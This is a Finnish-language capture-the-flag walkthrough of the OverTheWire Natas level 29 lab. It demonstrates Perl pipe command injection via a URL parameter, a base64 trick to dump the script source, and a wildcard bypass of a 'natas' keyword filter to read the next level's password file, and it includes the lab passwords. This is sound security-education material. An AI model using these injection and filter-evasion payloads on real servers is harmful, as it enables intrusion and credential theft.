# natas 29 - START HERE;

natas29 : 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns

http://natas29.natas.labs.overthewire.org

Perus avatessa tyhjä sivusto, mutta on sellainen valikko ja ihme teksti kuin: `c4n Y0 h4z s4uc3?` - *can you ... jotakin sauce?*

![alt text](./kuvat-level29-34/natas29-0.png)

![alt text](./kuvat-level29-34/natas29-1.png)

Valikosta löytyy muutama vaihtoehtoa ja tulostuksena tulee sellainen ascii art näköinen kuvio ja jokaiselta alta löytyy joku pitkä koodi pätkä / Linux näköinen terminaali rakennettu pohjana, että voi olla mukana erilaisia kommentteja. 

Jokaisen avatun tai vaihtaa ASCII arts mikälie niin vaihtuu URL parametri ja tämä yksi esim.

- `http://natas29.natas.labs.overthewire.org/index.pl?file=perl+underground+4`

![alt text](./kuvat-level29-34/natas29-2.png)

![alt text](./kuvat-level29-34/natas29-3.png)

Mahtaako olla jotakin *komentojen injektio* tasoa tällä hetkellä? Sekä tässä tasossa ei ole mainitu tuota **view-source.html** koodia eli html php koodia yhtään.

## Leetspeak - lyhyesti

Ainoastaan vihjeenä näissä ASCII art näkyvillä toistuu "P3RL UND3 GROUND" - ja kultuuria tätä kutsutaan **Leetspeak**. Leetspeak tarkoittaa lähtöisin oleva kirjoitustyyli, jossa yleensä käytetään isoja ja pieniä kirjaimia sekaisin, ja joskus korvataan osa kirjaimista muilla merkeillä, etenkin numeroilla ja vähä kuin internet slangia.

Vähä kuin kirjoitustapa, jossa korvataan kirjaimia numeroilla tai erikoismerkeillä, jotka näyttävät samalta kuin alkuperäiset kirjaimet. Se sai alkunsa hakkeri- ja nettiyhteisöissä 80- ja 90-luvuilla vähän kuin salakielenä tai sisäpiirin juttuna.


Pientä esimerkkiä **Leetspeak** kuin A - 4 tai @ , E on kuin 3, I (i) - 1 tai ! ja 5 on kuin S tai $. 


kevyt leet malli:
- s3cr3ts - secrets
- password - p4ssw0rd
- 1nt3rn3t - internet

Toinen mini esim. 4 toimii kuin äänityksellä for/four - usein tarkoitus on näyttää kekseliäältä, pelimäiseltä tai vähän trollaavalta.

Leetspeak - mukaan on usein käytetäviä eri vahvuuksia tai ns "tyylillä", jotka voida epävirallisesti jaotella *normi leetspeak* ja *vahva leetspeak* ja kolmantena, *oma tyyli*. Oma tyyli tarkoittaa voi itse rakentaa oman fiiliksen mukaan ja Leetspeak:illä ei ole mitään sääntöä tarkoituksena on enemmänkin näyttää "coolilta" tai tunnistaa kuuluvansa tiettyyn nettiyhteisöön tai huumorityyliin.


Esimerkit:
- elite hackers - 3|173 H4(k3r
- password - P@55\/\/0|2Ð


## pientä teoria ja harjoituksen idea


Tässä tapahtuu Perl komento injektiota eli Linux termistöä mm. pwd , ls, cat ja jne, mutta tässä ideana käyttää vaihtoehtoisia erikoismerkien käyttöä ja muita komentojen liitämistä suoritettavaksi komentoon. 

Etusivustossa on vaihtoehto ikkunna, jossa voi valita n. 5 eri "Pearl under ground" - niin se vaihtaa sen näkymänsä ja sama URL parametrikin muuttuu. Tämä yksi nistä, mutta vain perässä se luku muuttuu:


```
http://natas29.natas.labs.overthewire.org/index.pl?file=perl+underground+2
http://natas29.natas.labs.overthewire.org/index.pl?file=perl+underground+5
```

Tässä Perl vähä yrittä laittaa `file=` jotakin linux terminaalia ja sitä yleistä komentoa ja testat toimiiko. Eikä tässä kauheasti johtolankaakaan ole tarjolla, mutta yksi mitä on testattu on tiedoston polku eli lisätty perään: `../../../../../../../../etc/passwd` - ja tulostakaan ei annettu.

![alt text](./kuvat-level29-34/natas29-4.png)


Putkimerkki `|` on Unix/Linux shellissä erikoismerkki, joka putkittaa komennon tulosteen seuraavalle komennolle. Kuitenkin jonkinlainen merkki/erikoismerkki tai muiden komentojen liittämistä suoritettavaa komentoa.

Laitoin tällaisen URL parametriin perään kuin `|ls%00` -> `http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%00`

Tuloksena siellä tuli näin selaimeen: *index.pl perl underground 2.txt perl underground 3.txt perl underground 4.txt perl underground 5.txt perl underground.txt* 

Tämä `|ls%00` - tarkoittaa Null-byte eli `%00` tai `\x00` (ASCII-arvo 0) on klassinen temppu monissa injektiohyökkäyksissä, erityisesti vanhemmissa järjestelmissä tai ohjelmointikielissä kuten C/C++ tai PHP:n vanhoissa versioissa. Tämä voi johtaa siihen, että loput syötteestä jätetään huomiotta, mikä voi ohittaa suodatuksia tai rajoituksia.

- Jos syöttäisin tämän komennon curl komentoon niin pitää rakentaa se URL encode prosessi, jotta se ymmärtää.

![alt text](./kuvat-level29-34/natas29-5.png)


**Eteenpäin**
Eli todennäköisesti tämä `|ls%00` antoi vihjeen että putkesta eteenpäin syötettään Linux termistöjä kuten ls , pwd ja jne.

Kokeillaan: `http://natas29.natas.labs.overthewire.org/index.pl?file=|lsl` - tämä ei antanut mitään - mutta testattu kuitenkin 


**pwd** vuoro - `http://natas29.natas.labs.overthewire.org/index.pl?file=|pwd%00` ja toimii.

![alt text](./kuvat-level29-34/natas29-6.png)


Nyt pitäisi saada toi Linux polku sijoitettua tähän URL parametri perään, jotta se ymmärtää sen ja löytääkseen seuraavan levelin salasanansa.

**whoami** komento - `http://natas29.natas.labs.overthewire.org/index.pl?file=|%20whoami%00` - tämä toimi

![alt text](./kuvat-level29-34/natas29-8.png)


**cat** komento - `http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/natas_webpass/natas30%00`

Tuloksena: "meeeeeep!" - jaa mitä ihmettä. Se, että saat **"meep!"-viestin**, tarkoittaa että **palvelin havaitsee injektion ja estää sen jollain tavalla**. Tämä viittaa siihen, että `index.pl`-skriptissä on suodatuslogiikka, joka estää tiettyjä komentoja tai merkkejä — kuten `cat`, `|`, tai tiedostopolkuja.

![alt text](./kuvat-level29-34/natas29-7.png)


Seuraavaksi otettaan **base64** käyttöön ja pientä temppu suodatuksen kiertämiseksi. 

Kertauksena: **Base64** on tekstin koodaustapa, jota käytetään erityisesti silloin, kun binääristä dataa (esim. kuvia, tiedostoja tai salattua sisältöä) täytyy muuntaa tekstimuotoon, jotta se voidaan helposti siirtää tai tallentaa tekstipohjaisissa järjestelmissä (kuten sähköposteissa tai URL-osoitteissa).


Kokeilin sijoittaa tällaisen sanansa URL parametrin perään: `| cat index.pl | base64%00` - eli `http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20index.pl%20|%20base64%00` - tuloksena tulostui jotakin ylimääräistä ja tuntematonta tekstiä.


Voi olla jotakin base64-encode pitkää lorem ipsum tekstiä (lyhyest kopsattuna: IyEvdXNyL2Jpbi9wZXJsCnVzZSBDR0kgcXcoOnN0YW5kYXJkKTsKCnByaW50IDw8RU5EOwpDb250 ) - ja sivuston mukaan oikea klikkaus estetty - et jouduttaan käyttää CTRL + C

![alt text](./kuvat-level29-34/natas29-9.png)

![alt text](./kuvat-level29-34/natas29-10.png)

Laitettu cyberchef sivuston alle ja katsotaan mitä se tulostaa ja cyberchef mukaan **From base 64** ja output tulostuu html koodi - ja voi olla tämä on jotakin **index.pl** kontekstiä.

```
#!/usr/bin/perl
use CGI qw(:standard);

print <<END;
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas29", "pass": "31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">

<style>

#content {
    width: 1000px;
}
pre{
    background-color: #000000; 
    color: #00FF00; 
} 

</style>

<h1>natas29</h1>
<div id="content">
END
#
# morla /10111
# '$_=qw/ljttft3dvu{/,s/./print chr ord($&)-1/eg'
#
# credits for the previous level go to whoever 
# created insomnihack2016/fridginator, where i stole the idea from. 
# that was a fun challenge, Thanks! 
#

print <<END;
H3y K1dZ,<br>
y0 rEm3mB3rz p3Rl rit3?<br>
\\/\\/4Nn4 g0 olD5kewL? R3aD Up!<br><br>

<form action="index.pl" method="GET">
<select name="file" onchange="this.form.submit()">
  <option value="">s3lEcT suMp1n!</option>
  <option value="perl underground">perl underground</option>
  <option value="perl underground 2">perl underground 2</option>
  <option value="perl underground 3">perl underground 3</option>
  <option value="perl underground 4">perl underground 4</option>
  <option value="perl underground 5">perl underground 5</option>
</select>
</form>

END

if(param('file')){
    $f=param('file');
    if($f=~/natas/){
        print "meeeeeep!<br>";
    }
    else{
        open(FD, "$f.txt");
        print "<pre>";
        while (<FD>){
            print CGI::escapeHTML($_);
        }
        print "</pre>";
    }
}

print <<END;
<div id="viewsource">c4n Y0 h4z s4uc3?</div>
</div>
</body>
</html>
END
```

Tässä html koodi pätkässä on tärkeä osa tämä if-else parametri - koska hyökkäyksen harjoituksen kannalta:

```
if(param('file')){
    $f=param('file');
    if($f=~/natas/){
        print "meeeeeep!<br>";
    }
    else{
        open(FD, "$f.txt");
        print "<pre>";
        while (<FD>){
            print CGI::escapeHTML($_);
        }
        print "</pre>";
    }
}
```

![alt text](./kuvat-level29-34/natas29-11.png)


Tässä on muutamia vaihtoehtoja kiellettyjen merkkijonojen ohittamiseen. Löytämäni vaihtoehto sai inspiraationsa tästä CTF-kuvauksesta. Se käyttää jokerimerkkejä hakemiston tai tiedostonimen löytämiseen. Toi polku `/natas` voi olla ratkaisu polku.

## ratkaisua osa

**Seuraavaksi, kohti ratkaisua:**
Tässä tasossa puhuttu kokoajan Perl underground juttua - niin kyseessä on "natas" ja mitä tapahtuu muutettaan toi sana vähäsen. Suodatettaan ja muutettaan sitä yhdeksi erikoismerkiksi just esim. kysymysmerkki ? 

Tämä on virallinen ratkaisu: `http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/n?tas_webpass/n?tas30%20%00` - koska yritettään hakea se linux hakemisto polkun salasansa `etc/natas_webpass/natas30`. 

**natas30 : WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH**

## ratkaisu osa - välivaihe 

Yhdessä testissä: `http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/natas_webpass/natas30%00` - koska tämä url parametri tässä on suodatusta estääksen sen siksi saastu vihje "meeeep"

**miksi näin?**
Otin **natas** - sanasta, että merkitsee/korvaa erikoismerkejä tai muulla tahansa mielikuvituksella just jokerimerkkiäyhdistelmällä niin näin saa se tuloksensa. Koska erikoismerkien ideana on **kiertää suodatusta**, vaikka palvelin suodattaa suoraan sanan “natas”. Se estää komennon ennen kuin shell pääsee käsittelemään sitä. Vaikka se olisi teknisesti oikein, suodatus torppaa sen. Siksi harjoituksessa kierettään vastauksena: `|cat /etc/n?tas_webpass/n?tas30`

| Komento                                 | Toimiiko? | Selitys                                                  |
|-----------------------------------------|-----------|-----------------------------------------------------------|
| `cat /etc/natas_webpass/natas30`        | ❌ Ei      | Suodatus estää suoraan sanan “natas”                     |
| `cat /etc/n?tas_webpass/n?tas30`        | ✅ Kyllä   | `?` toimii jokerimerkkinä ja kiertää suodatuksen         |

Tässä harjoituksessa pitäis käyttää tätä: `etc/natas_webpass/natas30` - ja tästä muuttaa se perl underground ja käyttäen erikoismerkiä ja siksi vastaus on: `|cat%20/etc/n?tas_webpass/n?tas30%20%00`


![alt text](./kuvat-level29-34/natas29-12.png)


## Kali linux testausta 

Pientä tarkistusta varmuuden vuoksi ja harjoittelua, että testataan tätä natas 29 tasoa - ja ettei vain Perl komentojen injektiota.


Nikto testausta, sekä tässä suoritettaan webbi sivustojen skannausta ja syvällistä haavoittuvuutta jos on, sekä komennossa on perässä -id koska syötettään HTTP basic Auth (autentikointi) siksi on tunnus:salasana mukana.

```
┌──(kali㉿kali)-[~]
└─$ nikto -host http://natas29.natas.labs.overthewire.org -id natas29:31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          13.48.176.69
+ Target Hostname:    natas29.natas.labs.overthewire.org
+ Target Port:        80
+ Start Time:         2025-08-14 13:43:16 (GMT3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.58 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ / - Requires Authentication for realm 'Authentication required'
+ Successfully authenticated to realm 'Authentication required' with user-supplied credentials.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
 - STATUS: Completed 4530 requests (~65% complete, 2.8 minutes left): currently in plugin 'Nikto Tests'
- STATUS: Running average: 100 requests: 0.04210 sec, 10 requests: 0.0420 sec.
+ 9031 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2025-08-14 13:52:26 (GMT3) (550 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```


curl komentoja
```
┌──(kali㉿kali)-[~]
└─$ curl http://natas29.natas.labs.overthewire.org/ --user natas29:31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns                                   
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas29", "pass": "31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">

<style>

#content {
    width: 1000px;
}
pre{
    background-color: #000000; 
    color: #00FF00; 
} 

</style>

<h1>natas29</h1>
<div id="content">
H3y K1dZ,<br>
y0 rEm3mB3rz p3Rl rit3?<br>
\/\/4Nn4 g0 olD5kewL? R3aD Up!<br><br>

<form action="index.pl" method="GET">
<select name="file" onchange="this.form.submit()">
  <option value="">s3lEcT suMp1n!</option>
  <option value="perl underground">perl underground</option>
  <option value="perl underground 2">perl underground 2</option>
  <option value="perl underground 3">perl underground 3</option>
  <option value="perl underground 4">perl underground 4</option>
  <option value="perl underground 5">perl underground 5</option>
</select>
</form>

<div id="viewsource">c4n Y0 h4z s4uc3?</div>
</div>
</body>
</html>
```


```
┌──(kali㉿kali)-[~]
└─$ curl "http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/natas_webpass/natas30%00" --user natas29:31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas29", "pass": "31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">

<style>

#content {
    width: 1000px;
}
pre{
    background-color: #000000; 
    color: #00FF00; 
} 

</style>

<h1>natas29</h1>
<div id="content">
H3y K1dZ,<br>
y0 rEm3mB3rz p3Rl rit3?<br>
\/\/4Nn4 g0 olD5kewL? R3aD Up!<br><br>

<form action="index.pl" method="GET">
<select name="file" onchange="this.form.submit()">
  <option value="">s3lEcT suMp1n!</option>
  <option value="perl underground">perl underground</option>
  <option value="perl underground 2">perl underground 2</option>
  <option value="perl underground 3">perl underground 3</option>
  <option value="perl underground 4">perl underground 4</option>
  <option value="perl underground 5">perl underground 5</option>
</select>
</form>

meeeeeep!<br><div id="viewsource">c4n Y0 h4z s4uc3?</div>
</div>
</body>
</html>
```

## lisätietoa ja vihjeitä linkki


https://learnhacking.io/overthewire-natas-level-29-walkthrough/


https://anyafachri.medium.com/command-injection-via-file-inclusion-vulnerability-natas29-overthewire-write-up-16c801259edf


https://ivanitlearning.wordpress.com/2020/02/02/overthewire-natas2729/

---
